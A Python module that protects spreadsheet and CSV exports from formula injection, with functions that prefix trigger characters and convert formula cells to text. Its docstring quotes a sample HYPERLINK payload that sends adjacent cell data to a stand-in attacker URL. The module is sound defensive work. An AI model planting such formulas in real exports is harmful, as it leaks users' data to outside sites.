"""
Spreadsheet formula injection ("CSV injection") defences for exports.

Exports carry text people typed — customer, product and employee names,
notes. openpyxl stores any string starting with "=" as a live formula, so a
customer named =HYPERLINK("https://attacker/?"&B6,"Click") reached the owner's
Excel export as a working formula that could send neighbouring cells to an
outside site. CSV is read the same way by Excel and Sheets.

None of our exports write formulas on purpose, so:

- Excel: neutralise_workbook() turns every formula cell back into plain text
  just before the workbook is saved. The text shows exactly as typed.
- CSV: csv_safe() prefixes a leading = + - @ tab or CR with an apostrophe —
  the OWASP-recommended neutraliser — leaving genuine numbers like -1450.00 alone.
"""

import re

_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
_NUMBER = re.compile(r"[+-]?\d[\d,]*(\.\d+)?")


def csv_safe(value):
    if isinstance(value, str) and value.startswith(_TRIGGERS) and not _NUMBER.fullmatch(value):
        return "'" + value
    return value


def csv_safe_row(row):
    return [csv_safe(v) for v in row]


def neutralise_workbook(wb):
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                if cell.data_type == "f":
                    cell.data_type = "s"
    return wb
